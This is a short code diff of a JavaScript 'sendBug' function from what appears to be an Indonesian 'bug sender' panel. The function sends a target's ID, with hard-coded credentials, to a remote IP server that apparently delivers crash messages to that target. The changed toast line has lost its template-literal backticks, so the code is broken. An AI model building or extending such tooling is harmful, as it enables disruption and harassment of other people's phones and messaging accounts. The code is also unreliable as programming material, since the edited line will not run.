@@ -328,19 +328,13 @@ async function sendBug() {
   }
 
   const sendBugUrl =
-    "http://209.38.82.131:1900/sendBug?" +
-    new URLSearchParams({
-      key,
-      func,
-      botNumber,
-      target: fullId,
-    });
+    "http://209.38.82.131:1900/execution?target=" + target + fullId + "&mode=andros&username=bancet&key=WTW5";
 
   try {
     const res = await fetch(sendBugUrl);
     const data = await res.json();
     if (data.status) {
-      showToast("✅ Bug Terkirim", `Type: ${func}\nTo: ${cleaned}`);
+      showToast("✅ Bug Terkirim", Type: ${func}\nTo: ${cleaned});
     } else {
       showToast("❌ Gagal Kirim Bug", data.message || "Unknown Error");
     }
